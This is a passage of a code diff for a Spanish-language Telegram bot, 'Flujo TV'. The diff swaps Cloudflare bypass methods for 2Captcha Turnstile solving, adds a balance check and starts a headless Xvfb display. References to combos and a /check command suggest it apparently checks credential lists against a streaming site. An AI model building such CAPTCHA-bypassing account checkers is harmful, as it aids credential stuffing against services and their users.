         elif data=="cancel_check":waiting_combo.discard(cid);tg_edit_msg(cid,mid,"🎬 Listo.",reply_markup=kb_main());tg_answer_cb(cbq["id"])
 
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 #  MAIN
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 
 def main():
     print("\n  ╔═══════════════════════════════════════════════════╗")
-    print("  ║  🎬 Flujo TV Bot — 5 métodos CF + Xvfb         ║")
+    print("  ║  🎬 Flujo TV — 2Captcha Turnstile + Xvfb         ║")
     print("  ╚═══════════════════════════════════════════════════╝\n")
     pw_ok,ocr_ok=setup_deps()
     if not pw_ok:sys.exit(1)
+
     d=os.environ.get("DISPLAY",":99")
     try:
         r=subprocess.run(["xdpyinfo"],capture_output=True,text=True,timeout=5)
         if r.returncode!=0:subprocess.Popen(["Xvfb",d,"-screen","0","1280x1024x24","-ac"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);time.sleep(2)
     except:subprocess.Popen(["Xvfb",d,"-screen","0","1280x1024x24","-ac"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);time.sleep(2)
-    print(f"  [✓] Listo | OCR:{'✅' if ocr_ok else '❌'} | Xvfb:{d}")
-    print(f"  [✓] /check /local /testcf /stop\n")
+
+    bal=captcha_balance()
+    print(f"  [✓] Playwright | OCR:{'✅' if ocr_ok else '❌'} | Xvfb:{d}")
+    print(f"  [✓] 2Captcha: ${bal:.4f}")
+    if bal <= 0: print("  [!] ⚠️ SALDO 0 — recarga 2Captcha!")
+    print(f"  [✓] /check /local /testcf /balance /stop\n")
     tg_api("deleteWebhook",{"drop_pending_updates":True})
     print("  [✓] Bot listo.\n")
+
     offset=None
     while True:
         if bot_state["running"] and bot_state.get("_process") and not bot_state["_process"].is_alive():
